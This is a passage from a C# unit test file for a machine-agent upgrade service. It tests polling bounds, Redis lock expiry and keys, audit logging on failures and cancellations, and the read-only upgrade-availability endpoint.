                It.IsAny<System.Linq.Expressions.Expression<Func<IMachineHealthCheckService, Task>>>(),
                It.IsAny<TimeSpan>(),
                It.IsAny<string>()),
            Times.Never(),
            "no-op outcomes must not schedule rapid polling — nothing to observe");
    }

    [Fact]
    public void PollingWindowAndInterval_InReasonableRange()
    {
        // Bounds invariants:
        //   • interval ≥ 2s (FE polls at 2-3s; any tighter wastes RPCs)
        //   • interval ≤ 10s (> 10s and the FE sees "nothing new for 10s" gaps)
        //   • window ≥ 30s (< 30s and slow tarballs won't finish in the window)
        //   • window ≤ 2min (> 2min is noisy — waste after upgrade done)
        MachineUpgradeService.UpgradePollingIntervalSeconds.ShouldBeGreaterThanOrEqualTo(2,
            "interval < 2s hammers the agent + Hangfire; matches FE poll cadence at 3s");
        MachineUpgradeService.UpgradePollingIntervalSeconds.ShouldBeLessThanOrEqualTo(10,
            "interval > 10s creates visible refresh-gaps in UI progress");

        MachineUpgradeService.UpgradePollingWindowSeconds.ShouldBeGreaterThanOrEqualTo(30,
            "window < 30s risks cutting off before slow tarball finishes");
        MachineUpgradeService.UpgradePollingWindowSeconds.ShouldBeLessThanOrEqualTo(120,
            "window > 2min wastes RPCs after typical upgrade is long done");
    }

    [Fact]
    public void LockExpiry_BalancedForAbandonedLockRecoveryAndAutoExtendHeadroom()
    {
        // Invariant revised in 1.5.0 (Phase 1 A1). Rationale:
        //
        // RedLockNet auto-extends the lock at expiry/3 intervals while the
        // wrapped operation (RunStrategyAsync) is running. So:
        //   • ALIVE dispatch: lock persists indefinitely via auto-extend.
        //   • DEAD dispatch (server crash / OOM / pod rescheduled): lock
        //     expires in at most LockExpiry → operator can retry.
        //
        // Two competing forces on the TTL value:
        //   (a) TOO SHORT → transient Redis network jitter could make
        //       auto-extend miss > 1 cycle, losing the lock mid-dispatch.
        //       Hard floor of 5 min so a 30-60s network blip is absorbed.
        //   (b) TOO LONG → abandoned locks block operators for longer.
        //       Before 1.5.0 this was 20 min — known operator pain point
        //       (observed in 1.4.3 E2E: stuck for 20 min post server
        //       restart before next click could proceed). Ceiling of 10
        //       min keeps operator wait reasonable.
        //
        // Both bounds are tested so a future "raise this to fix a bug"
        // reviewer is forced to acknowledge the abandoned-lock trade-off.
        var expiry = MachineUpgradeService.LockExpiry;

        expiry.ShouldBeGreaterThanOrEqualTo(TimeSpan.FromMinutes(5),
            $"LockExpiry ({expiry}) too short — 30-60s Redis network blip could make RedLockNet " +
            "auto-extend miss a cycle (expiry/3 interval) and lose the lock mid-dispatch. 5 min floor.");

        expiry.ShouldBeLessThanOrEqualTo(TimeSpan.FromMinutes(10),
            $"LockExpiry ({expiry}) too long — crashed dispatch leaves orphan lock for up to this " +
            "duration, blocking operator retries. 1.4.x 20-min default was the problem. 10 min ceiling.");
    }

    [Fact]
    public async Task UpgradeAsync_LockKeyIsPerMachineId_AllowsParallelDifferentMachines()
    {
        // Verifies the lock key embeds machineId — two parallel upgrades on
        // different machines must both acquire their own (different) lock,
        // not contend on a global "upgrade" lock.
        ArrangeMachine(id: 71, style: nameof(CommunicationStyle.TentaclePolling));
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "ok", AgentVersionMayHaveChanged = true });

        var capturedKeys = new List<string>();
        _redisLock
            .Setup(x => x.ExecuteWithLockAsync<UpgradeMachineResponseData>(
                It.IsAny<string>(),
                It.IsAny<Func<Task<UpgradeMachineResponseData>>>(),
                It.IsAny<TimeSpan?>(), It.IsAny<TimeSpan?>(), It.IsAny<TimeSpan?>(),
                It.IsAny<RedisServer>()))
            .Returns<string, Func<Task<UpgradeMachineResponseData>>, TimeSpan?, TimeSpan?, TimeSpan?, RedisServer>(
                (key, logic, _, _, _, _) => { capturedKeys.Add(key); return logic(); });

        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 71 }, CancellationToken.None);

        capturedKeys.ShouldContain(k => k.Contains("71"), customMessage: "lock key must embed machineId");
        capturedKeys.ShouldAllBe(k => k.StartsWith("squid:upgrade:machine:"),
            customMessage: "lock key must use a stable namespace prefix");
    }

    // ========================================================================
    // Audit log — exception-path content pinning (Round-4 B2).
    // ========================================================================

    [Fact]
    public async Task UpgradeAsync_Exception_AuditLogCapturesTypeAndMessage()
    {
        // Round-3 A7 added try/finally audit logging but the exception path
        // just said "<exception propagated>" with no type/message —
        // forcing ops to correlate against other logs. B2 ensures a
        // Log.Error(ex, ...) fires with the `[UpgradeAudit]` prefix AND
        // the exception object itself (so Seq captures the stack).
        var originalLogger = Serilog.Log.Logger;
        var sink = new CapturingLogSink();
        Serilog.Log.Logger = new Serilog.LoggerConfiguration()
            .MinimumLevel.Verbose()
            .WriteTo.Sink(sink)
            .CreateLogger();

        try
        {
            _machineDataProvider
                .Setup(x => x.GetMachinesByIdAsync(999, It.IsAny<CancellationToken>()))
                .ThrowsAsync(new InvalidOperationException("simulated DB failure on machine load"));

            await Should.ThrowAsync<InvalidOperationException>(() =>
                _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 999 }, CancellationToken.None));

            var errorEvent = sink.Events.FirstOrDefault(e => e.Level == Serilog.Events.LogEventLevel.Error);
            errorEvent.ShouldNotBeNull("exception path must emit a Serilog.Error event with [UpgradeAudit] prefix");
            errorEvent.MessageTemplate.Text.ShouldContain("[UpgradeAudit]",
                customMessage: "must carry the audit prefix so ops can filter upgrade exceptions alongside successful audit logs");
            errorEvent.Exception.ShouldBeOfType<InvalidOperationException>(
                "exception object must be attached so Seq captures the full stack trace");
            errorEvent.Exception.Message.ShouldContain("simulated DB failure");
        }
        finally
        {
            Serilog.Log.Logger = originalLogger;
        }
    }

    [Fact]
    public async Task UpgradeAsync_Cancelled_AuditLogDoesNotEmitErrorLevel()
    {
        // OperationCanceledException is legitimate (user aborted / server
        // shutdown) — NOT an error. Only the outcome log should fire
        // (at Information level) with status=Exception; no Log.Error
        // should pollute ops dashboards.
        //
        // Filter the assertion by the `[UpgradeAudit]` message-template
        // prefix (same approach as the sibling _Exception_ test above) —
        // Serilog.Log.Logger is a GLOBAL static, so any test running in
        // parallel that emits its own Log.Error through unrelated code
        // would pollute our sink and trip an unscoped
        // `ShouldNotContain(... Level == Error)`. Restricting to audit-
        // tagged events makes this test assert ONLY on
        // MachineUpgradeService's behaviour regardless of what else is
        // running in the xUnit parallel group.
        var originalLogger = Serilog.Log.Logger;
        var sink = new CapturingLogSink();
        Serilog.Log.Logger = new Serilog.LoggerConfiguration()
            .MinimumLevel.Verbose()
            .WriteTo.Sink(sink)
            .CreateLogger();

        try
        {
            _machineDataProvider
                .Setup(x => x.GetMachinesByIdAsync(It.IsAny<int>(), It.IsAny<CancellationToken>()))
                .ThrowsAsync(new OperationCanceledException());

            await Should.ThrowAsync<OperationCanceledException>(() =>
                _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 1 }, CancellationToken.None));

            sink.Events.ShouldNotContain(
                e => e.Level == Serilog.Events.LogEventLevel.Error
                  && e.MessageTemplate.Text.Contains("[UpgradeAudit]"),
                "cancellation is not an error — MachineUpgradeService must not emit a [UpgradeAudit] Log.Error event");
        }
        finally
        {
            Serilog.Log.Logger = originalLogger;
        }
    }

    /// <summary>Minimal in-memory Serilog sink for pinning log contract in unit tests.</summary>
    private sealed class CapturingLogSink : Serilog.Core.ILogEventSink
    {
        public List<Serilog.Events.LogEvent> Events { get; } = new();

        public void Emit(Serilog.Events.LogEvent logEvent) => Events.Add(logEvent);
    }

    // ========================================================================
    // GetUpgradeInfoAsync — read-only endpoint powering FE's "upgrade available"
    // badge (FE Phase-2 §9.2). Pure read: no Redis lock, no dispatch, no
    // side effect — just a richer version comparison than the UI can do
    // client-side with just list data.
    // ========================================================================

    [Fact]
    public async Task GetUpgradeInfoAsync_MachineNotFound_ThrowsMachineNotFoundException()
    {
        _machineDataProvider
            .Setup(x => x.GetMachinesByIdAsync(404, It.IsAny<CancellationToken>()))
            .ReturnsAsync((Machine)null);

        var ex = await Should.ThrowAsync<MachineNotFoundException>(() =>
            _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 404 }, CancellationToken.None));

        ex.MachineId.ShouldBe(404);
    }

    [Fact]
    public async Task GetUpgradeInfoAsync_CurrentOlderThanLatest_CanUpgradeTrue()
    {
        // The primary UI signal: "new version N available". FE renders badge.
        ArrangeMachine(id: 1, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(1, new Dictionary<string, string>(), agentVersion: "1.3.9");

        var info = await _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 1 }, CancellationToken.None);

        info.CanUpgrade.ShouldBeTrue();
        info.CurrentVersion.ShouldBe("1.3.9");
        info.LatestAvailableVersion.ShouldBe("1.4.0");
        info.Reason.ShouldContain("1.4.0");
        info.Reason.ShouldContain("newer than current");
    }

    [Fact]
    public async Task GetUpgradeInfoAsync_SameVersion_CanUpgradeFalse_WithClearReason()
    {
        ArrangeMachine(id: 2, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(2, new Dictionary<string, string>(), agentVersion: "1.4.0");

        var info = await _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 2 }, CancellationToken.None);

        info.CanUpgrade.ShouldBeFalse();
        info.Reason.ShouldContain("Already on");
    }

    [Fact]
    public async Task GetUpgradeInfoAsync_CurrentNewerThanLatest_CanUpgradeFalse_NoSilentDowngrade()
    {
        // E.g. agent on 2.0.0-rc.1, registry's "latest stable" is 1.4.0.
        // FE should NOT show upgrade badge even though versions differ —
        // surfacing the badge would tempt a downgrade via one-click UX.
        ArrangeMachine(id: 3, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(3, new Dictionary<string, string>(), agentVersion: "2.0.0-rc.1");

        var info = await _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 3 }, CancellationToken.None);

        info.CanUpgrade.ShouldBeFalse();
        info.Reason.ShouldContain("newer than", Case.Insensitive);
    }

    [Fact]
    public async Task GetUpgradeInfoAsync_CurrentVersionUnknown_CanUpgradeTrue_DispatchDecidesActualOutcome()
    {
        // Cold cache — machine never health-checked. FE shows the upgrade
        // button (conservative default: let the user dispatch; the
        // AlreadyUpToDate path on actual upgrade will catch no-ops).
        ArrangeMachine(id: 4, style: nameof(CommunicationStyle.TentaclePolling));
        // intentionally not storing in runtimeCache → cold cache

        var info = await _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 4 }, CancellationToken.None);

        info.CanUpgrade.ShouldBeTrue();
        info.CurrentVersion.ShouldBe(string.Empty);
        info.Reason.ShouldContain("unknown", Case.Insensitive);
    }

    [Fact]
    public async Task GetUpgradeInfoAsync_NoStrategyForStyle_CanUpgradeFalse()
    {
        // SSH target or any future style without a strategy.
        ArrangeMachine(id: 5, style: "Ssh");

        var info = await _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 5 }, CancellationToken.None);

        info.CanUpgrade.ShouldBeFalse();
        info.Reason.ShouldContain("Ssh");
        info.Reason.ShouldContain("not supported", Case.Insensitive);
    }

    [Fact]
    public async Task GetUpgradeInfoAsync_RegistryReturnsEmpty_CanUpgradeFalse_WithOpsHint()
    {
        // Docker Hub unreachable + no env override; registry returns empty.
        // FE should show "version info unavailable" instead of "update button".
        ArrangeMachine(id: 6, style: nameof(CommunicationStyle.TentaclePolling));
        _versionRegistry
            .Setup(x => x.GetLatestVersionAsync(nameof(CommunicationStyle.TentaclePolling), It.IsAny<CancellationToken>()))
            .ReturnsAsync(string.Empty);
        _runtimeCache.Store(6, new Dictionary<string, string>(), agentVersion: "1.3.9");

        var info = await _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 6 }, CancellationToken.None);

        info.CanUpgrade.ShouldBeFalse();
        info.LatestAvailableVersion.ShouldBe(string.Empty);
        info.Reason.ShouldContain("Could not resolve", Case.Insensitive);
    }

    [Fact]
    public async Task GetUpgradeInfoAsync_MalformedEndpoint_CanUpgradeFalse_WithRegistrationHint()
    {
        _machineDataProvider
            .Setup(x => x.GetMachinesByIdAsync(7, It.IsAny<CancellationToken>()))
            .ReturnsAsync(new Machine { Id = 7, Name = "broken", Endpoint = "{}", SpaceId = 1 });

        var info = await _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 7 }, CancellationToken.None);

        info.CanUpgrade.ShouldBeFalse();
        info.Reason.ShouldContain("endpoint", Case.Insensitive);
    }

    [Fact]
    public async Task GetUpgradeInfoAsync_NonSemverCurrent_CanUpgradeTrue_ConservativeDispatch()
    {
        // Legacy / non-semver dev-build version string in cache. We can't
        // compare, so the SAFE default is allow (dispatch is idempotent on
        // the agent side anyway). Reason makes the fuzziness explicit.
        ArrangeMachine(id: 8, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(8, new Dictionary<string, string>(), agentVersion: "custom-build-20260419");

        var info = await _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 8 }, CancellationToken.None);

        info.CanUpgrade.ShouldBeTrue();
        info.Reason.ShouldContain("cannot compare", Case.Insensitive);
    }

    [Fact]
    public async Task GetUpgradeInfoAsync_DoesNotAcquireLock_OrDispatchStrategy()
    {
        // Critical: this is a READ endpoint. Must NOT hold a Redis lock
        // (would serialise readers), must NOT call strategy.UpgradeAsync
        // (would actually upgrade!). Pin both negative contracts.
        ArrangeMachine(id: 9, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(9, new Dictionary<string, string>(), agentVersion: "1.3.9");

        await _service.GetUpgradeInfoAsync(new GetUpgradeInfoRequest { MachineId = 9 }, CancellationToken.None);

        _redisLock.Verify(
            x => x.ExecuteWithLockAsync<UpgradeMachineResponseData>(
                It.IsAny<string>(),
                It.IsAny<Func<Task<UpgradeMachineResponseData>>>(),
                It.IsAny<TimeSpan?>(), It.IsAny<TimeSpan?>(), It.IsAny<TimeSpan?>(),
                It.IsAny<RedisServer>()),
            Times.Never,
            "GetUpgradeInfo is a read — must not serialise behind the upgrade lock");
        _linuxStrategy.Verify(
            s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()),
            Times.Never,
            "GetUpgradeInfo is a read — must never actually dispatch the upgrade");
    }

    private void ArrangeMachine(int id, string style)
    {
        var endpoint = $"{{\"CommunicationStyle\":\"{style}\",\"SubscriptionId\":\"sub-{id}\",\"Thumbprint\":\"AABB{id}\"}}";
        _machineDataProvider
            .Setup(x => x.GetMachinesByIdAsync(id, It.IsAny<CancellationToken>()))
            .ReturnsAsync(new Machine
            {
                Id = id,
                Name = $"machine-{id}",
                Endpoint = endpoint,
                SpaceId = 1
            });
    }
}
